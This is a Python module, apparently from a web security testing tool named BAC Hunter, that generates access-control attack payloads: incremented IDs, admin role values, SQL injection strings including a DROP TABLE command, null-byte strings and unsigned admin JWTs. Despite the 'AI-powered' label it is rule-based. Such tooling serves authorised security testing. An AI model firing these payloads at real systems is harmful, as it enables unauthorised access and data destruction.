"""
Intelligent Payload Generation for BAC Hunter
AI-powered contextual payload generation for various BAC scenarios
"""

from __future__ import annotations
import logging
import json
import re
import hashlib
import time
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass
from pathlib import Path
from enum import Enum
import random
import string

# Optional AI imports
try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False
    np = None

try:
    from transformers import pipeline, AutoTokenizer, AutoModelForSequenceGeneration
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False

log = logging.getLogger("ai.payload_generator")

class PayloadType(Enum):
    """Types of payloads that can be generated."""
    IDOR = "idor"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    SESSION_MANIPULATION = "session_manipulation"
    PARAMETER_POLLUTION = "parameter_pollution"
    HEADER_MANIPULATION = "header_manipulation"
    JWT_MANIPULATION = "jwt_manipulation"
    SQL_INJECTION = "sql_injection"
    NO_SQL_INJECTION = "nosql_injection"
    XPATH_INJECTION = "xpath_injection"
    LDAP_INJECTION = "ldap_injection"
    TEMPLATE_INJECTION = "template_injection"

class PayloadCategory(Enum):
    """Categories of payloads."""
    NUMERIC = "numeric"
    STRING = "string"
    BOOLEAN = "boolean"
    ARRAY = "array"
    OBJECT = "object"
    NULL = "null"
    SPECIAL_CHARS = "special_chars"

@dataclass
class PayloadContext:
    """Context information for payload generation."""
    target_url: str
    parameter_name: str
    parameter_type: str
    current_value: Any
    http_method: str
    headers: Dict[str, str]
    cookies: Dict[str, str]
    user_agent: str
    content_type: str
    authentication_type: Optional[str] = None
    session_data: Optional[Dict[str, Any]] = None

@dataclass
class GeneratedPayload:
    """A generated payload with metadata."""
    payload_id: str
    payload_type: PayloadType
    category: PayloadCategory
    value: Any
    description: str
    confidence: float
    context: PayloadContext
    tags: List[str]
    risk_level: str

class IntelligentPayloadGenerator:
    """AI-powered payload generator for BAC testing."""
    
    def __init__(self):
        self.payload_templates = self._load_payload_templates()
        self.context_analyzer = ContextAnalyzer()
        self.payload_optimizer = PayloadOptimizer()
        self.generation_history = []
        
    def _load_payload_templates(self) -> Dict[PayloadType, List[Dict]]:
        """Load payload templates from configuration."""
        templates = {
            PayloadType.IDOR: [
                {
                    "category": PayloadCategory.NUMERIC,
                    "patterns": ["increment", "decrement", "random", "boundary"],
                    "values": [1, 2, 3, 999, 1000, -1, 0]
                },
                {
                    "category": PayloadCategory.STRING,
                    "patterns": ["uuid", "email", "username"],
                    "values": ["admin", "root", "test", "null", ""]
                }
            ],
            PayloadType.PRIVILEGE_ESCALATION: [
                {
                    "category": PayloadCategory.STRING,
                    "patterns": ["role", "permission", "level"],
                    "values": ["admin", "superuser", "root", "manager", "user"]
                },
                {
                    "category": PayloadCategory.OBJECT,
                    "patterns": ["json_manipulation"],
                    "values": [{"role": "admin"}, {"permission": "all"}]
                }
            ],
            PayloadType.AUTHENTICATION_BYPASS: [
                {
                    "category": PayloadCategory.STRING,
                    "patterns": ["null_byte", "sql_injection", "jwt_manipulation"],
                    "values": ["' OR '1'='1", "admin'--", "null", ""]
                }
            ],
            PayloadType.SESSION_MANIPULATION: [
                {
                    "category": PayloadCategory.STRING,
                    "patterns": ["session_id", "token", "cookie"],
                    "values": ["admin_session", "null", "expired_token"]
                }
            ],
            PayloadType.JWT_MANIPULATION: [
                {
                    "category": PayloadCategory.STRING,
                    "patterns": ["header_manipulation", "payload_manipulation"],
                    "values": ["none", "HS256", "RS256"]
                }
            ]
        }
        
        return templates
    
    def generate_payloads(self, context: PayloadContext, payload_type: PayloadType, count: int = 10) -> List[GeneratedPayload]:
        """Generate contextual payloads for a specific scenario."""
        payloads = []
        
        # Analyze context to understand the target
        context_analysis = self.context_analyzer.analyze(context)
        
        # Get base templates for the payload type
        templates = self.payload_templates.get(payload_type, [])
        
        for i in range(count):
            # Select appropriate template based on context
            template = self._select_template(templates, context_analysis)
            
            # Generate payload value
            value = self._generate_payload_value(template, context, context_analysis)
            
            # Optimize payload based on context
            optimized_value = self.payload_optimizer.optimize(value, context, payload_type)
            
            # Create payload object
            payload = GeneratedPayload(
                payload_id=f"{payload_type.value}_{hashlib.md5(str(optimized_value).encode()).hexdigest()[:8]}",
                payload_type=payload_type,
                category=template["category"],
                value=optimized_value,
                description=self._generate_description(payload_type, template, context_analysis),
                confidence=self._calculate_confidence(context_analysis, template),
                context=context,
                tags=self._extract_tags(template, context_analysis),
                risk_level=self._assess_risk_level(payload_type, optimized_value)
            )
            
            payloads.append(payload)
        
        # Sort by confidence and remove duplicates
        payloads.sort(key=lambda x: x.confidence, reverse=True)
        unique_payloads = self._remove_duplicates(payloads)
        
        return unique_payloads[:count]
    
    def _select_template(self, templates: List[Dict], context_analysis: Dict) -> Dict:
        """Select the most appropriate template based on context analysis."""
        if not templates:
            return {"category": PayloadCategory.STRING, "patterns": ["default"], "values": ["test"]}
        
        # Score templates based on context relevance
        scored_templates = []
        for template in templates:
            score = 0
            
            # Check if template patterns match context
            for pattern in template["patterns"]:
                if pattern in context_analysis.get("detected_patterns", []):
                    score += 2
                if pattern in context_analysis.get("parameter_hints", []):
                    score += 1
            
            # Prefer templates that match the parameter type
            if template["category"].value in context_analysis.get("parameter_types", []):
                score += 1
            
            scored_templates.append((template, score))
        
        # Return template with highest score, or random if tied
        scored_templates.sort(key=lambda x: x[1], reverse=True)
        return scored_templates[0][0]
    
    def _generate_payload_value(self, template: Dict, context: PayloadContext, context_analysis: Dict) -> Any:
        """Generate a specific payload value based on template and context."""
        category = template["category"]
        patterns = template["patterns"]
        
        if category == PayloadCategory.NUMERIC:
            return self._generate_numeric_payload(patterns, context)
        elif category == PayloadCategory.STRING:
            return self._generate_string_payload(patterns, context, context_analysis)
        elif category == PayloadCategory.BOOLEAN:
            return self._generate_boolean_payload(patterns)
        elif category == PayloadCategory.ARRAY:
            return self._generate_array_payload(patterns, context)
        elif category == PayloadCategory.OBJECT:
            return self._generate_object_payload(patterns, context)
        elif category == PayloadCategory.NULL:
            return None
        elif category == PayloadCategory.SPECIAL_CHARS:
            return self._generate_special_chars_payload(patterns)
        else:
            return "test"
    
    def _generate_numeric_payload(self, patterns: List[str], context: PayloadContext) -> Union[int, float]:
        """Generate numeric payloads."""
        current_value = context.current_value
        
        if "increment" in patterns:
            if isinstance(current_value, (int, float)):
                return current_value + 1
            return 1
        elif "decrement" in patterns:
            if isinstance(current_value, (int, float)):
                return current_value - 1
            return -1
        elif "random" in patterns:
            return random.randint(1, 1000)
        elif "boundary" in patterns:
            return random.choice([0, 1, 999, 1000, -1, 999999])
        else:
            return random.randint(1, 100)
    
    def _generate_string_payload(self, patterns: List[str], context: PayloadContext, context_analysis: Dict) -> str:
        """Generate string payloads."""
        if "uuid" in patterns:
            return self._generate_uuid()
        elif "email" in patterns:
            return self._generate_email()
        elif "username" in patterns:
            return self._generate_username()
        elif "null_byte" in patterns:
            return "admin\x00"
        elif "sql_injection" in patterns:
            return self._generate_sql_injection()
        elif "jwt_manipulation" in patterns:
            return self._generate_jwt_payload()
        else:
            return random.choice(["admin", "root", "test", "null", ""])
    
    def _generate_boolean_payload(self, patterns: List[str]) -> bool:
        """Generate boolean payloads."""
        return random.choice([True, False])
    
    def _generate_array_payload(self, patterns: List[str], context: PayloadContext) -> List:
        """Generate array payloads."""
        if "id_enumeration" in patterns:
            return [1, 2, 3, 4, 5]
        elif "role_enumeration" in patterns:
            return ["user", "admin", "moderator"]
        else:
            return ["test", "payload"]
    
    def _generate_object_payload(self, patterns: List[str], context: PayloadContext) -> Dict:
        """Generate object payloads."""
        if "json_manipulation" in patterns:
            return {"role": "admin", "permission": "all"}
        elif "session_manipulation" in patterns:
            return {"session_id": "admin_session", "user_id": "admin"}
        else:
            return {"test": "payload"}
    
    def _generate_special_chars_payload(self, patterns: List[str]) -> str:
        """Generate special characters payloads."""
        special_chars = ["'", '"', ';', '--', '/*', '*/', '\\', '\x00', '\x0a', '\x0d']
        return random.choice(special_chars)
    
    def _generate_uuid(self) -> str:
        """Generate a UUID-like string."""
        return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
    
    def _generate_email(self) -> str:
        """Generate a test email."""
        domains = ["test.com", "example.com", "admin.local"]
        return f"admin@{random.choice(domains)}"
    
    def _generate_username(self) -> str:
        """Generate a test username."""
        usernames = ["admin", "root", "superuser", "test", "user"]
        return random.choice(usernames)
    
    def _generate_sql_injection(self) -> str:
        """Generate SQL injection payloads."""
        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR 1=1#"
        ]
        return random.choice(sql_payloads)
    
    def _generate_jwt_payload(self) -> str:
        """Generate JWT manipulation payloads."""
        jwt_payloads = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.invalid_signature"
        ]
        return random.choice(jwt_payloads)
    
    def _generate_description(self, payload_type: PayloadType, template: Dict, context_analysis: Dict) -> str:
        """Generate a description for the payload."""
        base_descriptions = {
            PayloadType.IDOR: "IDOR vulnerability test payload",
            PayloadType.PRIVILEGE_ESCALATION: "Privilege escalation attempt",
            PayloadType.AUTHENTICATION_BYPASS: "Authentication bypass attempt",
            PayloadType.SESSION_MANIPULATION: "Session manipulation test",
            PayloadType.JWT_MANIPULATION: "JWT token manipulation"
        }
        
        base_desc = base_descriptions.get(payload_type, "Security test payload")
        pattern_desc = ", ".join(template["patterns"])
        
        return f"{base_desc} using {pattern_desc} technique"
    
    def _calculate_confidence(self, context_analysis: Dict, template: Dict) -> float:
        """Calculate confidence score for the payload."""
        confidence = 0.5  # Base confidence
        
        # Increase confidence based on context match
        for pattern in template["patterns"]:
            if pattern in context_analysis.get("detected_patterns", []):
                confidence += 0.2
            if pattern in context_analysis.get("parameter_hints", []):
                confidence += 0.1
        
        # Increase confidence for common patterns
        common_patterns = ["increment", "decrement", "admin", "null"]
        for pattern in template["patterns"]:
            if pattern in common_patterns:
                confidence += 0.1
        
        return min(confidence, 1.0)
    
    def _extract_tags(self, template: Dict, context_analysis: Dict) -> List[str]:
        """Extract tags for the payload."""
        tags = []
        
        # Add pattern tags
        tags.extend(template["patterns"])
        
        # Add category tag
        tags.append(template["category"].value)
        
        # Add context-specific tags
        if context_analysis.get("authentication_required"):
            tags.append("auth_required")
        
        if context_analysis.get("sensitive_endpoint"):
            tags.append("sensitive")
        
        return tags
    
    def _assess_risk_level(self, payload_type: PayloadType, value: Any) -> str:
        """Assess the risk level of a payload."""
        high_risk_types = [PayloadType.SQL_INJECTION, PayloadType.AUTHENTICATION_BYPASS]
        high_risk_values = ["admin", "root", "superuser", "' OR '1'='1"]
        
        if payload_type in high_risk_types:
            return "high"
        
        if isinstance(value, str) and any(risk_val in str(value).lower() for risk_val in high_risk_values):
            return "high"
        
        if payload_type in [PayloadType.PRIVILEGE_ESCALATION, PayloadType.SESSION_MANIPULATION]:
            return "medium"
        
        return "low"
    
    def _remove_duplicates(self, payloads: List[GeneratedPayload]) -> List[GeneratedPayload]:
        """Remove duplicate payloads based on value."""
        seen_values = set()
        unique_payloads = []
        
        for payload in payloads:
            value_str = str(payload.value)
            if value_str not in seen_values:
                seen_values.add(value_str)
                unique_payloads.append(payload)
        
        return unique_payloads

class ContextAnalyzer:
    """Analyzes context to optimize payload generation."""
    
    def analyze(self, context: PayloadContext) -> Dict[str, Any]:
        """Analyze the context to extract useful information."""
        analysis = {
            "detected_patterns": [],
            "parameter_hints": [],
            "parameter_types": [],
            "authentication_required": False,
            "sensitive_endpoint": False,
            "api_endpoint": False,
            "web_endpoint": False
        }
        
        # Analyze parameter name
        param_name = context.parameter_name.lower()
        if "id" in param_name:
            analysis["detected_patterns"].extend(["increment", "decrement", "boundary"])
            analysis["parameter_types"].append("numeric")
        elif "user" in param_name:
            analysis["detected_patterns"].extend(["username", "email"])
            analysis["parameter_types"].append("string")
        elif "role" in param_name or "permission" in param_name:
            analysis["detected_patterns"].extend(["role", "permission"])
            analysis["parameter_types"].append("string")
        elif "session" in param_name or "token" in param_name:
            analysis["detected_patterns"].extend(["session_manipulation", "jwt_manipulation"])
            analysis["parameter_types"].append("string")
        
        # Analyze URL
        url = context.target_url.lower()
        if "/api/" in url:
            analysis["api_endpoint"] = True
        if "/admin" in url or "/user" in url:
            analysis["sensitive_endpoint"] = True
        if "/auth" in url or "/login" in url:
            analysis["authentication_required"] = True
        
        # Analyze headers
        if "Authorization" in context.headers:
            analysis["authentication_required"] = True
            analysis["detected_patterns"].append("jwt_manipulation")
        
        # Analyze current value
        if context.current_value is not None:
            if isinstance(context.current_value, (int, float)):
                analysis["parameter_types"].append("numeric")
            elif isinstance(context.current_value, str):
                analysis["parameter_types"].append("string")
            elif isinstance(context.current_value, bool):
                analysis["parameter_types"].append("boolean")
            elif isinstance(context.current_value, list):
                analysis["parameter_types"].append("array")
            elif isinstance(context.current_value, dict):
                analysis["parameter_types"].append("object")
        
        return analysis

class PayloadOptimizer:
    """Optimizes payloads based on context and historical success."""
    
    def __init__(self):
        self.success_history = {}
        self.optimization_rules = self._load_optimization_rules()
    
    def _load_optimization_rules(self) -> Dict[str, Any]:
        """Load optimization rules."""
        return {
            "idor": {
                "prefer_increment": True,
                "test_boundaries": True,
                "include_negative": True
            },
            "privilege_escalation": {
                "prefer_admin_values": True,
                "test_role_hierarchy": True
            },
            "authentication_bypass": {
                "prefer_sql_injection": True,
                "test_null_bytes": True
            }
        }
    
    def optimize(self, value: Any, context: PayloadContext, payload_type: PayloadType) -> Any:
        """Optimize a payload based on context and rules."""
        rules = self.optimization_rules.get(payload_type.value, {})
        
        if payload_type == PayloadType.IDOR and isinstance(value, (int, float)):
            return self._optimize_idor_payload(value, rules)
        elif payload_type == PayloadType.PRIVILEGE_ESCALATION:
            return self._optimize_privilege_payload(value, rules)
        elif payload_type == PayloadType.AUTHENTICATION_BYPASS:
            return self._optimize_auth_bypass_payload(value, rules)
        
        return value
    
    def _optimize_idor_payload(self, value: Union[int, float], rules: Dict) -> Union[int, float]:
        """Optimize IDOR payload."""
        if rules.get("prefer_increment") and isinstance(value, (int, float)):
            return value + 1
        
        if rules.get("test_boundaries"):
            return random.choice([0, 1, 999, 1000])
        
        if rules.get("include_negative"):
            return random.choice([value, -1, -value])
        
        return value
    
    def _optimize_privilege_payload(self, value: Any, rules: Dict) -> Any:
        """Optimize privilege escalation payload."""
        if rules.get("prefer_admin_values") and isinstance(value, str):
            admin_values = ["admin", "root", "superuser", "administrator"]
            return random.choice(admin_values)
        
        return value
    
    def _optimize_auth_bypass_payload(self, value: Any, rules: Dict) -> Any:
        """Optimize authentication bypass payload."""
        if rules.get("prefer_sql_injection") and isinstance(value, str):
            sql_payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT 1,2,3--"]
            return random.choice(sql_payloads)
        
        if rules.get("test_null_bytes") and isinstance(value, str):
            return f"{value}\x00"
        
        return value
    
    def update_success_history(self, payload_id: str, success: bool):
        """Update success history for a payload."""
        if payload_id not in self.success_history:
            self.success_history[payload_id] = {"success": 0, "total": 0}
        
        self.success_history[payload_id]["total"] += 1
        if success:
            self.success_history[payload_id]["success"] += 1